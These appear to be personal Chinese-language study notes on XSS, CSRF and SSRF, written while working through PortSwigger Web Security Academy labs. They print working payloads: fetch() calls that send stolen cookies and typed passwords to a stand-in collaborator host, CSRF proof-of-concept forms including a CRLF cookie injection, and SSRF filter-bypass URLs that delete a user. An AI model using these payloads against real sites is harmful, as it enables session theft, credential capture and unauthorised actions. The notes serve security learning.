# XSS

portswigger：https://portswigger.net/web-security/learning-path

## XSS分类

xss：https://portswigger.net/web-security/cross-site-scripting

### 反射型

拿到一个用户提交的数据之后，就直接在页面中进行展示了。



xss备忘单，payload：

burpsuite：https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

owasp：https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

github：https://github.com/swisskyrepo/PayloadsAllTheThings

https://github.com/payloadbox/xss-payload-list



### 存储型

持久化的保存到服务器上面，可以保存在文件、数据库等里面，只要能持久化就可以了。

### DOM型

反射型跟存储型都会经过后端，反射不会持久化到服务器上而存储型会持久化到服务器上面；

而DOM型不会经过后端代码，而是直接有前端的js直接进行处理。



## 如何执行js代码

即无论是“反射型、存储型还是DOM型”其目的就是为了执行我们的js代码；哪里可以执行我们的js代码呢？

1、在html文件当中只要在`<script>`标签里面都是可以执行js代码的；

2、html元素的事件也是可以执行js代码的，事件类型：https://www.w3schools.com/tags/ref_eventattributes.asp，如以下代码，当鼠标移动到h1元素类型上面时，会触发一个弹窗；

```html
<h1 onmouseover="alert(1)">这是一个测试，测试html事件触发js操作</h1>
<!--当然上面的alert(1)这个位置也可以换成一个js函数，本质上都是一样的，都是要执行js代码。-->
```

3、css配合html也可以执行js代码，这里通常是annotation标签。

```css
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
```

4、超链接相关的有`javasecript:alert(1)`;



Window对象（整个浏览器）包含属性：document、location、navigator、screen、history、frames

![img](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\XSS笔记\xss笔记.assets\1gRMkpPF9o_hAPGS4iJKCDQ.png)

Document（每一个页面）根节点包含子节点：forms、embeds、anchors、images、links

![document object model - DOM in JavaScript](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\XSS笔记\xss笔记.assets\document-object-model-DOM-in-JavaScript.jpg)



该`<embed>`标签为外部资源定义了一个容器，例如网页、图片、媒体播放器或插件应用程序：

```html
<embed type="image/jpg" src="pic_trulli.jpg" width="300" height="200">  // 嵌入图像
<embed type="text/html" src="snippet.html" width="500" height="200"> // 嵌入式 HTML 页面
```



锚点`<a>`定义与用法：

anchors 属性已弃用。不要使用它。

anchors 属性只返回那些具有 name 属性的 `<a>` 元素。

HTML5 不支持` <a> `元素的名称属性。



## HTML DOM 

### Attributes

1、属性对象

在HTML DOM中，一个Attr对象代表一个HTML属性；

HTML属性始终属于HTML元素；

2、命名节点图

NamedNodeMap是元素属性的类似数组的无序集合 **。**

换句话说：NamedNodeMap 是**Attr objects**的列表。

NamedNodeMap 具有返回节点数的**长度属性。**

可以通过名称或索引号访问节点。索引从 0 开始

3、属性特性

| Property                                                     | Description                                                  |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| [isId](https://www.w3schools.com/jsref/prop_attr_isid.asp)   | [Deprecated](https://www.w3schools.com/jsref/prop_attr_isid.asp) |
| [name](https://www.w3schools.com/jsref/prop_attr_name.asp)   | Returns an attribute's name                                  |
| [value](https://www.w3schools.com/jsref/prop_attr_value.asp) | Sets or returns an attribute's value                         |
| [specified](https://www.w3schools.com/jsref/prop_attr_specified.asp) | Returns true if the attribute is specified(是否指定了该属性) |

4、NamedNodeMap 属性和方法

| Method                                                       | Description                                              |
| :----------------------------------------------------------- | :------------------------------------------------------- |
| [getNamedItem()](https://www.w3schools.com/jsref/met_namednodemap_getnameditem.asp) | Returns an attribute node (by name) from a NamedNodeMap  |
| [item()](https://www.w3schools.com/jsref/met_namednodemap_item.asp) | Returns an attribute node (by index) from a NamedNodeMap |
| [length](https://www.w3schools.com/jsref/prop_namednodemap_length.asp) | Returns the number of attributes in a NamedNodeMap       |
| [removeNamedItem()](https://www.w3schools.com/jsref/met_namednodemap_removenameditem.asp) | Removes an attribute (node)                              |
| [setNamedItem()](https://www.w3schools.com/jsref/met_namednodemap_setnameditem.asp) | Sets an attribute (node) by name                         |

```javascript
const nodeMap = document.getElementById("light").attributes;
let value = nodeMap.getNamedItem("src").value;  

document.getElementById("demo").innerHTML = value;
```



### anchors

anchors 属性只返回那些具有 name 属性的 `<a>` 元素。



### baseURL

返回页面url地址栏里面的地址。



### designMode

获取设计模式

```js
document.designMode="on";  // 使文档可编辑
```



### execCommand()

执行一些命令，其命令有：https://www.w3schools.com/jsref/met_document_execcommand.asp

```html
<!DOCTYPE html>
<html>
<body onkeydown="myFunction(event)">

<h1>The Document Object</h1>
<h2>The execCommand() Method</h2>

<p>The executeCommand() method executes a specified command on selected text.</p>
<p>Select some text in this page, and press SHIFT to make the selected text toggle between bold and normal.</p>

<script>
document.designMode = "on";

function myFunction(event) {
  if (event.keyCode == 16) {
    // Execute command if user presses the SHIFT button:
    document.execCommand("bold");
  }
}
</script>

</body>
</html>
```



## HTML Elements

在 HTML DOM 中，**Element 对象**表示一个 HTML 元素，如 p、div、a、table 或任何其他 HTML 元素。



### innerHTML

该`innerHTML`属性设置或返回元素的 HTML 内容（内部 HTML）。



### innerText

该`innerText`属性设置或返回元素的文本内容。



1） innerHTML设置或获取标签所包含的HTML+文本信息(从标签起始位置到终止位置全部内容，包括HTML标签，但不包括自身)

2） outerHTML设置或获取标签自身及其所包含的HTML+文本信息（包括自身）

3） innerText设置或获取标签所包含的文本信息（从标签起始位置到终止位置的内容，去除HTML标签，但不包括自身）

4） outerText设置或获取标签自身及其所包含的文本信息（包括自身）
![image.png](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\XSS笔记\xss笔记.assets\1625231416_60df1038e61fe4a91995d.png!small)innerText和outerText在获取的时候是相同效果，但在设置时，innerText仅设置标签所包含的文本，而outerText设置包含包括标签自身在内的文本。



## HTML Events

### change

```html
<select id="mySelect" onchange="myFunction()"> 
    <!--需要注意的是change与onchange的区别，这里的onchange如果写成change，那么这个时候就需要加一个监听器来实现；所以这里的on就相当于是已经开启了一个监听器了。监听器详细信息：https://www.w3schools.com/jsref/met_document_addeventlistener.asp-->
  <option value="Audi">Audi</option>
  <option value="BMW">BMW</option>
  <option value="Mercedes">Mercedes</option>
  <option value="Volvo">Volvo</option>
</select>

<p>When you select a new car, a function is triggered which outputs the value of the selected car.</p>

<p id="demo"></p>

<script>
function myFunction() {
  var x = document.getElementById("mySelect").value;
  document.getElementById("demo").innerHTML = "You selected: " + x;
}
</script>
```





## XSS注入点

XSS（反射、存储）注入与SQL注入本质上都是相同的，就是将一些不合法的数据注入到应用程序当中；只不过说它们具体的payload不一样；所以只要与后端交互并将结果输出到页面中的输入点都可能存在XSS注入；



**DOM型注入**

dom型跟反射型非常的相似，但是dom型的数据不会经过后端处理（这里需要注意的是：dom型只是数据不会经过后端，但是还是要向后端发请求的），通常是直接由前端的js进行处理。

```js
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}                   
```



靶场：https://0a3b0042043a64ee81b53912008300ad.web-security-academy.net/?search=1



## Fuzzy

### ALL tags

```
a
a2
abbr
acronym
address
animate
animatemotion
animatetransform
applet
area
article
aside
audio
audio2
b
bdi
bdo
big
blink
blockquote
body
br
button
canvas
caption
center
cite
code
col
colgroup
command
content
custom tags
data
datalist
dd
del
details
dfn
dialog
dir
div
dl
dt
element
em
embed
fieldset
figcaption
figure
font
footer
form
frame
frameset
h1
head
header
hgroup
hr
html
i
iframe
iframe2
image
image2
image3
img
img2
input
input2
input3
input4
ins
kbd
keygen
label
legend
li
link
listing
main
map
mark
marquee
menu
menuitem
meta
meter
multicol
nav
nextid
nobr
noembed
noframes
noscript
object
ol
optgroup
option
output
p
param
picture
plaintext
pre
progress
q
rb
rp
rt
rtc
ruby
s
samp
script
section
select
set
shadow
slot
small
source
spacer
span
strike
strong
style
sub
summary
sup
svg
table
tbody
td
template
textarea
tfoot
th
thead
time
title
tr
track
tt
u
ul
var
video
video2
wbr
xmp
```

### events

```
onafterprint
onanimationend
onanimationiteration
onanimationstart
onauxclick
onbeforecopy
onbeforecut
onbeforeinput
onbeforeprint
onbeforeunload
onbegin
onblur
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncontextmenu
oncopy
oncuechange
oncut
ondblclick
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onend
onended
onerror
onfocus
onfocusin
onfocusout
onhashchange
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onload
onloadeddata
onloadedmetadata
onmessage
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onpagehide
onpageshow
onpaste
onpause
onplay
onplaying
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onpopstate
onprogress
onratechange
onrepeat
onreset
onresize
onscroll
onsearch
onseeked
onseeking
onselect
onselectionchange
onselectstart
onsubmit
ontimeupdate
ontoggle
ontouchend
ontouchmove
ontouchstart
ontransitionend
onunload
onvolumechange
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkittransitionend
onwheel
```



### payload

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet



## Custom Tags

自定义标签，如`<deelmind>deelmind</deelmind>`。在js中我们自定义的标签可以组合大多数的html标签的事件，如：`<abddd onclick="alert(1)">1</abddd>`。







## SVG

https://developer.mozilla.org/zh-CN/docs/Web/SVG

```html
<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <circle cx="50" cy="50" r="50"/>
</svg> 
```



## XSS编码&闭合

为什么要编码：http://www.ietf.org/rfc/rfc1738.txt

控制字符；这些必须编码。

不安全：

由于多种原因，字符可能不安全。空格字符是不安全的，因为当 URL 被转录或排版或受到文字处理程序的处理时，重要的空格可能会消失，而无关紧要的空格可能会被引入。字符“<”和“>”是不安全的，因为它们在自由文本中用作 URL 周围的分隔符；引号 (""")在某些系统中用于分隔 URL。字符“#”跟着它。字符“%”是不安全的，因为它用于 其他字符的编码。其他字符是不安全的，因为已知网关和其他传输代理有时会修改此类字符。这些字符是“{”、“}”、“|”、“\”、“^”、“~”、“[”、“]”和“`”



标签闭合：

```
" onclick="alert(1)
```



## accessKey

accessKey：https://www.runoob.com/tags/att-global-accesskey.html

通过accessKey属性可以定义一个快捷键，如：

```html
<link accesskey="t" onclick="alert(1)"/>  # 按alt+t即可实现弹窗
```



## XSS语法绕过

```js
// 字符串的运算
> 1+""
< '1'

> 1+2
< 3

> 1-""
< 1

> 1+alert()
< NaN

> ""-alert()-"" # 可以理解为对整个字符串进行运行时需要alert()函数执行的返回值
< NaN

> ""*alert()
< NaN
```

实验：

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped



## 字符串模板

菜鸟：https://www.runoob.com/w3cnote/es6-string.html

W3：https://www.w3schools.com/js/js_string_templates.asp

模板字符串相当于加强版的字符串，用反引号 **`**,除了作为普通字符串，还可以用来定义多行字符串，还可以在字符串中加入变量和表达式。



字符串插入变量和表达式。

变量名写在 ${} 中，${} 中可以放入 JavaScript 表达式，包括函数。

```js
let name = "Mike";
let age = 27;
let info = `My Name is ${name},I am ${age+1} years old next year.`
console.log(info);
// My Name is Mike,I am 28 years old next year.
```

```js
`${alert()}` # 可以正常弹窗
```



实验：

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped



### 标签模板

标签模板，是一个函数的调用，其中调用的参数是模板字符串。

```js
alert`Hello world!`;
// 等价于
alert('Hello world!');
```





## fetch

ajax：https://www.runoob.com/ajax/ajax-tutorial.html

异步编程：https://www.runoob.com/js/js-async.html

Promise：https://www.runoob.com/js/js-promise.html

fetch：https://blog.csdn.net/allway2/article/details/122558044



JavaScript 中的fetch()方法 用于向服务器请求并加载网页中的信息。请求可以是返回 JSON 或 XML 格式数据的任何 API。此方法返回一个承诺。

句法：

```
fetch( url, options )
```

参数：此方法接受上面提到的两个参数，如下所述：

URL：这是要向其发出请求的 URL。
选项：它是一组属性。它是一个可选参数。
返回值：它返回一个承诺，无论它是否已解决。返回数据的格式可以是 JSON 或 XML。
它可以是对象数组，也可以是单个对象。



实验：https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

payload：`5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`

说明：

-   &表示参数的拼接，即传递多个参数；

-   `x=x=>{throw/**/onerror=alert,1337}`是一个箭头函数，可以写成：

    ```js
    var x = function(x){
        throw onerror=alert,1337
    }
    // 表示当这个函数出现错误的时候会自动调用触发onerror属性，然后调用alert()函数
    ```

-   toString=x重载window的toString方法

-   window+''将当前window对象当做字符串进行输出，这时就会触发我们上面的toString函数；



## 实体编码绕过

遇到实体引号被转义时可以使用实体编码进行绕过一些检测：

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

```
Character	Entity 	Number
"			&#34;	&quot;
'			&#39;	&apos; 
&			&#38;	&amp;
<			&#60;	&lt;
>			&#62;	&gt;
```





## DOM-based vulnerabilities

### DOM XSS Web Message

postMessage()用法：https://www.runoob.com/js/met-win-postmessage.html

ifrome对象：https://www.w3school.com.cn/jsref/dom_obj_frame.asp



题目：https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages



### DOM-based open redirection

题目：https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection

js正则表达式：

exec方法：https://www.w3school.com.cn/jsref/jsref_regexp_exec.asp





## cookie steal

```js
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
```

题目：https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies



## password capture

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```



## 非get型XSS&CSS配合

与sql注入一样，xss也会存在于post、header中（只要直接将用户提交的数据输出到页面当中的地方就可能存在xss）。显然post的方式比起get方法的利用难度要大一点，因为get直接就是一个url，而post可能就需要构造一个页面，诱惑用户去点击进而触发相应的事件。

```html
<body>
    <form action="#" method="post" onload="this.submit()">
        <input type="hidden" value="payload" name="field-name">
    </form>
</body>
```





## XSS Bybass

### 编码绕过

```
< 			&lt;   	&LT;	&#x0003c;	&#60;
>			&gt; 	&GT;	&#x0003E;	&#62;
```





https://tools.w3cub.com/html-entities



### 标签/事件/协议过滤

```
tag (img,svg) filter
tag->event filter
protocal filter
```



大小写、编码、特殊字符、变形；





## 工具

XSStrike：https://github.com/s0md3v/XSStrike/

xsshunter：https://github.com/mandatoryprogrammer/xsshunter



## 其它APP

微信小程序；

各种小程序；

安卓；

IOS软件；



## 黑盒攻击流程

找可能的XSS点：Fuzzy

```
<tag event="protocal:xxx">
<a href="javascript:alert(1)">af</a>
```







# CSRF



什么是CSRF（Cross Site Request Forgery，跨站请求伪造），攻击者盗用了你的身份，以你的名义发送恶意请求。

![image-20230420110041466](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\XSS笔记\xss笔记.assets\image-20230420110041466.png)







## CSRF必备的三个关键条件

-   **一个相关的动作。**应用程序中存在攻击者有理由诱导的操作。这可能是特权操作（例如修改其他用户的权限）或针对用户特定数据的任何操作（例如更改用户自己的密码）。
-   **基于 cookie 的会话处理。**执行该操作涉及发出一个或多个 HTTP 请求，应用程序仅依赖会话 cookie 来识别发出请求的用户。没有其他机制来跟踪会话或验证用户请求。
-   **没有不可预测的请求参数。**执行操作的请求不包含任何参数（参数值攻击者无法确定或猜测）。例如，当导致用户更改密码时，如果攻击者需要知道现有密码的值，则该函数不易受到攻击。





## Token

### CSRF where token validation depends on request method

该csrf token的有效性来自于特定的请求方式，在这里依赖于post的方式，将数据包的请求方式更改为get的方式之后，csrf token就失效了。

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method



### CSRF where token is not tied to user session

由于csrf token没有与用户的session进行绑定，将用户wiener提交的数据包构造为csrf poc，并将其中的csrf token替换为要攻击的用户的token（注意这里的token只能是没有在邮箱中使用过的），然后发送给该用户，只要一点击便可中招。

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session



### CSRF where token is tied to non-session cookie

该题目的关键是csrf token并没有与用户的session进行绑定，而是与cookie csrfKey进行绑定的，如果将这两个值替换为有效值之后，发给受害者用户，即可触发csrf漏洞。

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a22004a0304b1e28015e97c004d0048.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="3340000544@qq.com" />
      <input type="hidden" name="csrf" value="So0vmeiTnlQ9KGTBhTxuuSSYH8rnDjpt" />
      <input type="submit" value="Submit request" />
    </form>
		<img src="https://0a22004a0304b1e28015e97c004d0048.web-security-academy.net?search=1fdas%0d%0aSet-Cookie:%20csrfKey=OaIzdxyyR7k6EqYDwRg8v0pOfcufMoAP%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

这里设置`<img>`标签主要是发起get请求以设置服务端给客户端的指定的cookie的值。`%0d%0a`表示换行，`%3b%20`表示;号。





## Referer



### 步骤：

1、移除referer头，看看效果；

2、检查引用标头的哪一部分是应用程序验证



### Lab: CSRF where Referer validation depends on header being present

这里的关键是在http的请求头当中是否存在referer字段，如果不存在，则不影响，如果存在，则一定会检测是否来自当前域的请求，所以我们这里将请求头当中的referer字段取消即可。

```html
<html>
  <meta name="referrer" content="no-referrer">
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a3200420425269c812458c400210003.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="22222&#64;qq&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```



### Lab: CSRF with broken Referer validation

history：https://developer.mozilla.org/

history.pushState()：

https://developer.mozilla.org/zh-CN/docs/Web/API/History/pushState

referrer-policy：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referrer-Policy

改题目的关键是后端在检验referrer时，只是简单的判断referer字段里面是否包含本源（域）名，所以这里可以使用history.puseState()进行绕过。

```
Referrer-Policy: unsafe-url
```



```html
<html>
  <body>
  <script>history.pushState('', '', '/?https://0a5600b604f8f3b28129855200900015.web-security-academy.net')</script>
    <form action="https://0a5600b604f8f3b28129855200900015.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="11&#64;qq&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```



### 防护

1、同源检测；

2、samesite cookie；https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html

3、csrf token；

4、referer；

5、httpOnly，secure（用在https中）；



# 源（origin）

Web 内容的**源**由用于访问它的 [URL](https://developer.mozilla.org/zh-CN/docs/Glossary/URL) 的*方案*（协议）、*主机名*（域名）和*端口*定义。只有当协议、主机和端口都匹配时，两个对象才具有相同的源。

某些操作仅限于同源内容，但可以使用 [CORS](https://developer.mozilla.org/zh-CN/docs/Glossary/CORS) 解除这个限制。

参考：https://developer.mozilla.org/zh-CN/docs/Glossary/Origin



# OWASP-TOP10-2021

https://github.com/h4m5t/Sec-Interview/blob/main/OWASP-TOP10-2021%E4%B8%AD%E6%96%87%E7%89%88V1.0%E5%8F%91%E5%B8%83.pdf

![image-20230425152230786](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\XSS笔记\xss笔记.assets\image-20230425152230786.png)



# SSRF

server-side request forgery，服务端请求伪造。

![SSRF](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\XSS笔记\xss笔记.assets\server-side request forgery.svg)



### Basic SSRF against the local server

这里是由于前段在检查库存的时候会向服务器后端发起一个http的请求，该请求StockAPI的参数是可以控制的，所以这里便导致了SSRF漏洞。



StockApi=http://localhost/admin/delete?username=carlos



## bypass

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

本地回环地址（127.0.0.1）的几种等价写法：

```
Desktop> ping 127.0.0.1
Desktop> ping 127.1  	 # 这里系统在执行的时候会自动填充缺少的两位八字节，解析为：127.0.0.1
Desktop> ping 127.100.100.1
Desktop> ping 127.1.1	 # 解析为127.1.0.1
Desktop> ping 2130706433 # 数字ip
Desktop> ping localhost

当然除了绕过主机地址，对url路劲当中的一些字符串也可以使用url编码的方式进行绕过。一次不行就两次编码，反正多试几次就OK了。
```



### SSRF with blacklist-based input filter

```
stockApi=http://127.1/%25%36%31dmin/delete?username=carlos

# 使用127.1绕过127.0.0.1的限制，%25%36%31是a的双重url编码
```





### SSRF with whitelist-based input filter

关键点1：

```
http://username@stock.weliketoshop.net/
# @符号前面的内容被url解析器为url嵌入式的凭据
```

关键点2：

```
stockApi=http://127.0.0.1%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos

%2523是#号的双重url编码，在url地址栏中#好后面的内容(直到遇到/号为止)被视为页面上的一个锚点，然后通过在反斜杠/后面添加响应的地址来表示url的有效地址。
```

LAB: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter





### Blind SSRF with out-of-band detection

SSRF可能存在的点，与其他的漏洞一样，请求头当中的每一个字段，如host、referer这些都是可能存在SSRF漏洞的，因为它们的字段值通常是以url的形式，后台可能会对这些url做出一些请求。

LAB:https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter



### Blind SSRF with Shellshock exploitation

